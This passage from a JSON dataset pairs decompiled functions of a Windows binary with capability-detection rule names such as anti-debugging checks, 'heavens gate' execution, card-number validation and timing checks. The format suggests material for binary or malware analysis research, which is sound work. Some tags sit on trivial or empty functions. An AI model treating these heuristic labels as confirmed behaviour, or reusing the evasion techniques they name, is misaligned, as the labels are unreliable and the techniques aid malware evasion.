            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.0046dee0(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x42) == '\\x02';\n}\n",
        "token_count": 50
    },
    "00427938": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427938(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint lpSystemInfo;\n    int16_t iStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    sub.kernel32.dll_GetSystemInfo(&lpSystemInfo);\n    var_8h = var_8h + -1;\n    if (-1 < var_8h) {\n        if (iStack16 == 3) {\n            do {\n                uVar1 = *(var_4h + var_8h * 4);\n                *(var_4h + var_8h * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                var_8h = var_8h + -1;\n            } while (-1 < var_8h);\n        }\n        else {\n            do {\n                uVar1 = *(var_4h + var_8h * 4);\n                *(var_4h + var_8h * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                var_8h = var_8h + -1;\n            } while (-1 < var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "004409d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004409d8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x4409ef;\n    iVar1 = fcn.00440d74();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x440a03;\n    iVar1 = fcn.004037f0();\n    puStack32 = 0x440a0e;\n    fcn.004408d4();\n    uStack36 = 0x440ac5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.00440d74();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00440d38();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.00440d38();\n                fcn.0041c358();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00403a28();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x440acc;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x440a7f;\n        iVar2 = fcn.0041c4c8();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x440a90;\n            fcn.0043cd5c();\n        }\n        else {\n            uStack36 = 0x440a9b;\n            fcn.0043cd5c();\n        }\n        uStack36 = 0x440aaa;\n        fcn.0041c3a4();\n    }\n    uStack36 = 0x440abc;\n    fcn.00403820();\n    uStack36 = 0x440ac4;\n    fcn.004408dc();\n    return;\n}\n",
        "token_count": 512
    },
    "00476c98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00476c98(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x476d16;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = fcn.004754e0();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.0046d190();\n            if (*(piVar2 + 0x42) == '\\x03') {\n                (**(*piVar2 + 100))();\n                (**(*piVar2 + 0xb4))();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x476d1d;\n    uStack44 = 0x476d15;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 276
    },
    "004770e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t fcn.004770e4(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    bool bVar2;\n    uint var_4h;\n    \n    uVar1 = in_EAX & 0xffffff00 | *(in_EAX + 0x9d) - 4;\n    if (*(in_EAX + 0x9d) - 2U < 2) {\n        fcn.00477084(&stack0xfffffffc);\n        (**(*in_EAX + 0xac))();\n        (**(*in_EAX + 0xdc))();\n        bVar2 = *(in_EAX + 0x9d) == '\\x03';\n        if (bVar2) {\n            (**(*in_EAX + 0xfc))();\n        }\n        fcn.00476b0c();\n        (**(*in_EAX + 0x15c))();\n        (**(*in_EAX + 0x10c))();\n        fcn.004749a0();\n        (**(*in_EAX + 0x250))();\n        uVar1 = (**(*in_EAX + 0xb8))();\n        if (bVar2) {\n            uVar1 = (**(*in_EAX + 0xd8))();\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 289
    },
    "00403c50": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403c50(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0040406c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.0040406c(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 54
    },
    "0041f5c0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f5c0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41f637;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00406298();\n    if (param_2 != 0) {\n        iVar2 = fcn.00418374();\n        fcn.00406298(iVar2 + 5);\n        cVar1 = fcn.0040e664();\n        if (cVar1 == '\\0') {\n            fcn.00406298();\n        }\n    }\n    fcn.004192a8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41f63e;\n    uStack24 = 0x41f636;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 255
    },
    "00423dfc": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423dfc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 50
    },
    "00447310": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447310(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.00447230(&stack0xfffffffc);\n        fcn.00447288(*(arg_8h + 0xc) + -2, &stack0xfffffffc);\n        fcn.00447288(*(arg_8h + 0xc) + -2, &stack0xfffffffc);\n    }\n    else {\n        fcn.00447230(&stack0xfffffffc);\n        fcn.00447288(*(arg_8h + 4) + 5, &stack0xfffffffc);\n        fcn.00447288(*(arg_8h + 4) + 8, &stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00401f14": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401f14(uint param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *in_EAX;\n    \n    puVar1 = (param_2 - 4) + in_EAX;\n    if (0xf < param_2) {\n        *puVar1 = 0x80000007;\n        fcn.00402110();\n        return;\n    }\n    if (3 < param_2) {\n        *in_EAX = param_2 | 0x80000002;\n        *puVar1 = param_2 | 0x80000002;\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00401f50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00401f50(void)\n\n{\n    int32_t in_EAX;\n    \n    *0x4855b4 = *0x4855b4 + 1;\n    *0x4855b8 = *0x4855b8 + ((*(in_EAX + -4) & 0x7ffffffc) - 4);\n    fcn.0040266c();\n    return;\n}\n",
        "token_count": 92
    },
    "00402254": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00402254(void)\n\n{\n    uint32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    uStack28 = *in_EAX;\n    uStack24 = in_EAX[1];\n    fcn.00402208();\n    fcn.00401578();\n    if (uStack20 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (uStack20 < uStack28) {\n            iVar2 = fcn.00401f9c();\n            uStack28 = uStack28 - iVar2;\n            uStack24 = uStack24 + iVar2;\n        }\n        if (uStack28 + uStack24 < uStack20 + iStack16) {\n            iVar2 = fcn.00402014();\n            uStack24 = uStack24 + iVar2;\n        }\n        if (uStack20 + iStack16 == uStack28 + uStack24) {\n            fcn.00401f14();\n            uStack24 = uStack24 - 4;\n        }\n        *0x485620 = uStack28;\n        *0x48561c = uStack24;\n        uVar1 = CONCAT31(uStack24 >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 315
    },
    "00402844": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402844(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    \n    uVar5 = param_2 + 7U & 0xfffffffc;\n    if (uVar5 < 0xc) {\n        uVar5 = 0xc;\n    }\n    puVar2 = in_EAX + -4;\n    uVar8 = *puVar2 & 0x7ffffffc;\n    puVar3 = puVar2 + uVar8;\n    if (uVar8 == uVar5) {\n        uVar4 = 1;\n    }\n    else {\n        uVar6 = uVar5;\n        if (uVar5 < uVar8) {\n            uVar7 = uVar8 - uVar5;\n            if (puVar3 == *0x485620) {\n                *0x485620 = *0x485620 - uVar7;\n                *0x48561c = *0x48561c + uVar7;\n                if (*0x48561c < 0xc) {\n                    *0x485620 = *0x485620 + uVar7;\n                    *0x48561c = *0x48561c - uVar7;\n                    uVar6 = uVar8;\n                }\n            }\n            else {\n                if ((*puVar3 & 2) == 0) {\n                    uVar7 = uVar7 + puVar3[2];\n                    fcn.00401e3c();\n                }\n                uVar6 = uVar8;\n                if (0xb < uVar7) {\n                    *(puVar2 + uVar5) = uVar7 | 2;\n                    fcn.00401f50();\n                    uVar6 = uVar5;\n                }\n            }\ncode_r0x00402a22:\n            *0x4855b8 = *0x4855b8 + (uVar6 - uVar8);\n            *puVar2 = uVar6 | *puVar2 & 0x80000003;\n            uVar4 = 1;\n        }\n        else {\n            while( true ) {\n                iVar9 = uVar5 - uVar8;\n                if (puVar3 == *0x485620) {\n                    if (iVar9 <= *0x48561c) {\n                        *0x48561c = *0x48561c - iVar9;\n                        *0x485620 = *0x485620 + iVar9;\n                        if (*0x48561c < 0xc) {\n                            *0x485620 = *0x485620 + *0x48561c;\n                            uVar5 = uVar5 + *0x48561c;\n                            *0x48561c = 0;\n                        }\n                        *0x4855b8 = *0x4855b8 + (uVar5 - uVar8);\n                        *puVar2 = uVar5 | *puVar2 & 0x80000003;\n                        return 1;\n                    }\n                    fcn.00402208();\n                    puVar3 = puVar2 + uVar8;\n                }\n                if ((*puVar3 & 2) == 0) {\n                    uVar7 = puVar3[2];\n                    if (iVar9 <= uVar7) {\n                        fcn.00401e3c();\n                        if (uVar7 - iVar9 < 0xc) {\n                            uVar6 = uVar5 + (uVar7 - iVar9);\n                            puVar3 = puVar2 + uVar6;\n                            *puVar3 = *puVar3 & 0xfffffffe;\n                        }\n                        else {\n                            fcn.00402110();\n                        }\n                        goto code_r0x00402a22;\n                    }\n                    puVar3 = puVar3 + uVar7;\n                }\n                if (((*puVar3 & 0x80000000) == 0) ||\n                   (cVar1 = fcn.0040230c(puVar2, (*puVar3 & 0x7ffffffc) + puVar3),  cVar1 == '\\0')) break;\n                puVar3 = puVar2 + uVar8;\n            }\n            uVar4 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1002
    },
    "00405a24": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a24(uint param_1)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00405a44(param_1, *(in_EAX + -4));\n        return;\n    }\n    fcn.00405b44();\n    return;\n}\n",
        "token_count": 75
    },
    "00408b78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00408b78(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    uVar3 = 0;\n    iVar2 = fcn.00404888();\n    if ((iVar2 != 0) && (((cVar1 = *in_EAX,  cVar1 + 0xbfU < 0x1a || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)))) {\n        iVar2 = fcn.00404888();\n        if (1 < iVar2) {\n            iVar2 = iVar2 + -1;\n            iVar4 = 2;\n            do {\n                cVar1 = in_EAX[iVar4 + -1];\n                if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                    return 0;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 293
    },
    "00408c7c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408c7c(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 423
    },
    "004094a8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.004094a8(void)\n\n{\n    int32_t in_EAX;\n    \n    return CONCAT44(in_EAX + -4, *(in_EAX + -4) + -4);\n}\n",
        "token_count": 45
    },
    "004094f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004094f0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00402b44();\n    }\n    return;\n}\n",
        "token_count": 47
    },
    "0040c424": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040c424(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0x40c5e2;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040c424::var_ch;\n    iVar6 = 1;\n    fcn.004045c8();\n    var_10h = unaff_EBP + -8;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040c0e0(var_10h);\n    iVar3 = fcn.00408da0();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.00404888(),  iVar6 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar6);\n            if ((*((uVar4 >> 3) + 0x483110) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.004093dc();\n                if (iVar3 == 0) {\n                    fcn.00404890();\n                    iVar6 = iVar6 + 1;\n                }\n                else {\n                    iVar3 = fcn.004093dc();\n                    if (iVar3 == 0) {\n                        fcn.00404890();\n                        iVar6 = iVar6 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.004093dc();\n                        if (iVar3 == 0) {\n                            fcn.00404890();\n                            iVar6 = iVar6 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar6);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00404890();\n                            }\n                            else {\n                                fcn.004047b0();\n                                fcn.00404890();\n                            }\n                        }\n                    }\n                }\n                iVar6 = iVar6 + 1;\n            }\n            else {\n                uVar5 = fcn.0040d528();\n                *(unaff_EBP + -4) = uVar5;\n                var_10h = unaff_EBP + -0x10;\n                fcn.00404ae8();\n                fcn.00404890();\n                iVar6 = iVar6 + *(unaff_EBP + -4);\n            }\n        }\n    }\n    else {\n        if ((*0x485748 == 4) || (*0x485748 - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.00404888(),  iVar6 <= iVar3; iVar6 = iVar6 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar6);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.004047b0();\n                    fcn.00404890();\n                }\n            }\n        }\n        else {\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = var_10h;\n    var_8h = 0x40c5e9;\n    var_ch = 0x40c5e1;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 864
    },
    "004170c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004170c0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t in_EAX;\n    uint uVar6;\n    uint8_t uVar7;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    uint *in_stack_ffffffd4;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint32_t uVar8;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack36 = 0x417369;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar3 = *(*(arg_8h + 0xc) + 3 + in_EAX);\n    uVar7 = uVar3 & 0x7f;\n    uVar8 = uVar7;\n    bVar9 = (uVar3 & 0x80) == 0;\n    if (uVar8 == 10) {\n        in_stack_ffffffd4 = 0x417112;\n        puStack32 = &stack0xfffffffc;\n        fcn.00415c4c();\n    }\n    else if (uVar8 == 0x48) {\n        iVar1 = *(arg_8h + -8) + *(arg_8h + -0xc) * 8;\n        if (bVar9) {\n            in_stack_ffffffd4 = &fcn.004170c0::var_8h;\n            puStack32 = &stack0xfffffffc;\n            fcn.00404ae8();\n            fcn.00404e20();\n            *(iVar1 + 4) = 0;\n            *(*(arg_8h + -4) + in_EAX * 0x10) = 8;\n            uVar6 = fcn.00404e30();\n            *(*(arg_8h + -4) + 8 + in_EAX * 0x10) = uVar6;\n        }\n        else {\n            in_stack_ffffffd4 = &fcn.004170c0::var_4h;\n            puStack32 = &stack0xfffffffc;\n            fcn.00404ae8();\n            fcn.00404e20();\n            *(iVar1 + 4) = **(arg_8h + -0x10);\n            *(*(arg_8h + -4) + in_EAX * 0x10) = 0x4008;\n            *(*(arg_8h + -4) + 8 + in_EAX * 0x10) = iVar1;\n        }\n        *(arg_8h + -0xc) = *(arg_8h + -0xc) + 1;\n    }\n    else if (bVar9) {\n        if (uVar8 == 0xc) {\n            puVar4 = *(arg_8h + -0x10);\n            if (*puVar4 == 0x100) {\n                iVar1 = *(arg_8h + -0xc);\n                iVar5 = *(arg_8h + -8);\n                in_stack_ffffffd4 = &fcn.004170c0::var_ch;\n                puStack32 = &stack0xfffffffc;\n                fcn.00404ae8();\n                fcn.00404e20();\n                *(iVar5 + iVar1 * 8 + 4) = 0;\n                *(*(arg_8h + -4) + in_EAX * 0x10) = 8;\n                uVar6 = fcn.00404e30();\n                *(*(arg_8h + -4) + 8 + in_EAX * 0x10) = uVar6;\n                *(arg_8h + -0xc) = *(arg_8h + -0xc) + 1;\n            }\n            else {\n                puVar2 = *(arg_8h + -4) + in_EAX * 0x10;\n                *puVar2 = *puVar4;\n                puVar2[1] = puVar4[1];\n                puVar2[2] = puVar4[2];\n                puVar2[3] = puVar4[3];\n                *(arg_8h + -0x10) = *(arg_8h + -0x10) + 0xc;\n                puStack32 = &stack0xfffffffc;\n            }\n        }\n        else {\n            *(*(arg_8h + -4) + in_EAX * 0x10) = uVar7;\n            iVar1 = *(*0x4846ac + 4 + uVar8 * 0xc);\n            if ((iVar1 - 1U < 2) || (iVar1 == 4)) {\n                *(*(arg_8h + -4) + 8 + in_EAX * 0x10) = **(arg_8h + -0x10);\n                puStack32 = &stack0xfffffffc;\n            }\n            else if (iVar1 == 8) {\n                *(*(arg_8h + -4) + 8 + in_EAX * 0x10) = **(arg_8h + -0x10);\n                *(*(arg_8h + -4) + 0xc + in_EAX * 0x10) = *(*(arg_8h + -0x10) + 4);\n                *(arg_8h + -0x10) = *(arg_8h + -0x10) + 4;\n                puStack32 = &stack0xfffffffc;\n            }\n            else {\n                in_stack_ffffffd4 = 0x417347;\n                fcn.00416f84();\n            }\n        }\n    }\n    else {\n        puStack32 = &stack0xfffffffc;\n        if ((uVar8 == 0xc) && (puStack32 = &stack0xfffffffc,  ***(arg_8h + -0x10) == 0x100)) {\n            in_stack_ffffffd4 = 0x8;\n            puStack32 = &stack0xfffffffc;\n            fcn.00416fc4(8);\n        }\n        *(*(arg_8h + -4) + in_EAX * 0x10) = uVar7 | 0x4000;\n        *(*(arg_8h + -4) + 8 + in_EAX * 0x10) = **(arg_8h + -0x10);\n    }\n    *(arg_8h + -0x10) = *(arg_8h + -0x10) + 4;\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x417370;\n    iStack40 = 0x417368;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1566
    },
    "004275b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004275b4(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 71
    },
    "004451c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004451c8(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.004544bc();\n    if (iVar1 == 0) {\n        return;\n    }\n    if (param_2 != 9) {\n        if (param_2 == 0x12) {\n            uVar2 = 0;\n            fcn.00407594();\n            fcn.0043e9fc(uVar2);\n            return;\n        }\n        if (3 < param_2 - 0x25U) {\n            return;\n        }\n    }\n    uVar2 = 0;\n    fcn.00407594();\n    fcn.0043e9fc(uVar2);\n    return;\n}\n",
        "token_count": 178
    },
    "00464214": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_42h\n\nuint32_t __cdecl fcn.00464214(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint8_t *in_EAX;\n    uint32_t uVar4;\n    uint32_t in_ECX;\n    int32_t iVar5;\n    int32_t in_EDX;\n    int32_t iVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint var_42h;\n    \n    *in_EAX = in_EDX;\n    in_EAX[1] = in_ECX;\n    iVar6 = in_ECX - 4;\n    if (iVar6 != 0) {\n        iVar5 = in_EDX;\n        if (3 < in_ECX && iVar6 != 0) {\n            do {\n                in_EDX = iVar5 + -1;\n                *(&var_42h + iVar5 + 1) = 0;\n                iVar6 = iVar6 + -1;\n                iVar5 = in_EDX;\n            } while (iVar6 != 0);\n        }\n        else {\n            _arg_8h = ROUND(_arg_8h / *(iVar6 * 4 + 0x48401c));\n        }\n    }\n    if (_arg_8h < 0) {\n        bVar8 = arg_8h != 0;\n        arg_8h = -arg_8h;\n        arg_ch = -bVar8 - arg_ch;\n        in_EAX[1] = in_EAX[1] | 0x80;\n    }\n    do {\n        uVar7 = arg_8h | arg_ch;\n        uVar4 = arg_ch;\n        if (uVar7 != 0) {\n            uVar7 = 0;\n            if (arg_ch != 0) {\n                uVar4 = arg_ch / 10;\n                uVar7 = arg_ch % 10;\n            }\n            uVar2 = CONCAT44(uVar7, arg_8h);\n            arg_8h = uVar2 / 10;\n            uVar7 = uVar2 % 10;\n        }\n        *(&var_42h + in_EDX + 1) = uVar7;\n        in_EDX = in_EDX + -1;\n        arg_ch = uVar4;\n    } while (in_EDX != 0);\n    uVar7 = (arg_8h | uVar4) & 0xffffff00;\n    if ((arg_8h | uVar4) == 0) {\n        uVar4 = *in_EAX + 1 >> 1;\n        do {\n            uVar1 = *(&var_42h + uVar4 * 2);\n            uVar3 = uVar1 & 0xffffff00;\n            uVar7 = uVar7 & 0xffff0000 | uVar3;\n            in_EAX[uVar4 + 1] = uVar1 << 4 | uVar3 >> 8;\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n        uVar7 = CONCAT31(uVar7 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 726
    },
    "0046db34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046db34(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack432;\n    uint uStack428;\n    uchar *puStack424;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_148h;\n    uint var_144h;\n    uint var_44h;\n    uint var_4h;\n    \n    puStack424 = &stack0xfffffffc;\n    var_148h = 0;\n    uStack428 = 0x46dc6a;\n    iStack432 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack432;\n    var_4h = param_2;\n    fcn.00403770();\n    fcn.00403098();\n    iVar2 = 1;\n    if (var_44h._1_1_ == 'T') {\n        iVar2 = 2;\n    }\n    if (4 < var_44h - iVar2) {\n        fcn.00402cd0(&var_188h);\n        fcn.0040482c();\n        fcn.004089a0();\n    }\n    arg_8h = &var_188h;\n    fcn.00402cd0(arg_8h, 0);\n    